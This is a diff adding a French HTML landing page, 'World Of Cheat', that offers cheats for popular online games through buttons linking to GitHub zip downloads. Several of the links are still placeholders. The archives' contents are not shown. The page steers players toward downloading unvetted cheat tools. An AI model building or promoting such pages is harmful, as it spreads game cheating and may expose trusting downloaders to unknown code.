@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>World Of Cheat - Générateur de Cheats Professionnel</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body, html {
+            height: 100%;
+            overflow: auto;
+        }
+        body {
+            font-family: 'Roboto', sans-serif;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: black;
+            padding: 20px;
+        }
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('https://media.discordapp.net/attachments/1302688771690467432/1302697082288865392/image.png?ex=67290eb3&is=6727bd33&hm=3816b3e47f300db0b14d0529368e8fc3530fd0a2e41af88541dba33208f78896&=&format=webp&quality=lossless&width=1188&height=676');
+            background-size: cover;
+            background-position: center;
+            filter: brightness(70%);
+            z-index: -1;
+        }
+        .container {
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 2rem;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 90%;
+            width: 800px;
+            position: relative;
+        }
+        .main-title {
+            font-size: 3em;
+            font-weight: bold;
+            margin-bottom: 1rem;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }
+        h1 {
+            font-size: 1.5em;
+            font-weight: normal;
+            margin-bottom: 2rem;
+        }
+        .button-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+        .big-button {
+            font-size: 1em;
+            padding: 12px 24px;
+            border-radius: 5px;
+            border: none;
+            color: white;
+            background-color: #007bff;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .big-button:hover {
+            background-color: #0056b3;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 123, 255, 0.3);
+        }
+        .decorative-button {
+            font-size: 0.9em;
+            padding: 8px 16px;
+            border-radius: 5px;
+            border: none;
+            color: #fff;
+            background-color: transparent;
+            border: 2px dashed #fff;
+            cursor: default;
+        }
+        .decorative-button:hover {
+           background-color:#fff;
+           color:black;
+           transition:.3s;
+        }
+        .disclaimer {
+            margin-top: 2rem;
+            font-size: 0.8em;
+            opacity: 0.7;
+        }
+        .warning {
+            margin-top: 1rem;
+            font-size: 1em;
+            color: yellow;
+        }
+        .decorative-container {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        .side-decoration {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+        .side-decoration.left {
+            left: -80px;
+        }
+        .side-decoration.right {
+            right: -80px;
+        }
+        .top-decoration {
+            position: absolute;
+            top: -60px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+    </style>
+</head>
+<body>
+   <div class="background"></div>
+   <div class="container">
+       <div class="top-decoration">
+           <button class="decorative-button">🏆 Champions</button>
+       </div>
+       <div class="side-decoration left">
+           <button class="decorative-button">🎯</button>
+       </div>
+       <div class="side-decoration right">
+           <button class="decorative-button">🚀</button>
+       </div>
+       <div class="main-title">World Of Cheat</div>
+       <h1>Générateur de cheat professionnel pour vos jeux préférés</h1>
+       <div class="button-container">
+           <button onclick="installCheat('fortnite')" class="big-button">Cheat Fortnite</button>
+           <button onclick="installCheat('roblox')" class="big-button">Cheat Roblox</button>
+           <button onclick="installCheat('minecraft')" class="big-button">Cheat Minecraft</button>
+           <button onclick="installCheat('csgo')" class="big-button">Cheat CS:GO</button>
+           <button onclick="installCheat('valorant')" class="big-button">Cheat Valorant</button>
+           <button onclick="installCheat('apex')" class="big-button">Cheat Apex Legends</button>
+           <button onclick="installCheat('warzone')" class="big-button">Cheat Warzone</button>
+           <button onclick="installCheat('lol')" class="big-button">Cheat League of Legends</button>
+           <button onclick="installCheat('gta5')" class="big-button">Cheat GTA V</button>
+           <button onclick="installCheat('pubg')" class="big-button">Cheat PUBG</button>
+           <button onclick="installCheat('overwatch')" class="big-button">Cheat Overwatch</button>
+           <button onclick="installCheat('rainbow6')" class="big-button">Cheat Rainbow Six Siege</button>
+       </div>
+
+       <div class="decorative-container">
+           <button class="decorative-button">🎮 Jouez avec style!</button>
+           <button class="decorative-button">✨ Améliorez votre expérience!</button>
+           <button class="decorative-button">🚀 Boostez vos compétences!</button>
+       </div>
+
+       <p class="disclaimer">Attention : L'utilisation de cheats peut être contre les conditions d'utilisation des jeux.</p>
+       <p class="warning">AUCUNE information personnelle n'est requise.</p>
+   </div>
+
+   <script>
+       function installCheat(game) {
+           const links = {
+               'fortnite': "https://codeload.github.com/1001Storm/fortnite/zip/refs/heads/main",
+               'roblox': "https://codeload.github.com/1001Storm/Roblox/zip/refs/heads/main",
+               'minecraft': "https://codeload.github.com/1001Storm/minecraft/zip/refs/heads/main",
+               'csgo': "https://codeload.github.com/1001Storm/cs-go/zip/refs/heads/main", // Lien mis à jour pour CS:GO
+               'valorant': "lien_vers_valorant",
+               'apex': "lien_vers_apex",
+               'warzone': "lien_vers_warzone",
+               'lol': "lien_vers_lol",
+               'gta5': "lien_vers_gta5",
+               'pubg': "lien_vers_pubg",
+               'overwatch': "lien_vers_overwatch",
+               'rainbow6': "lien_vers_rainbow6"
+           };
+           if (links[game]) {
+               window.location.href = links[game];
+           } else {
+               alert("Ce cheat n'est pas disponible.");
+           }
+       }
+   </script>
+</body>
+</html>
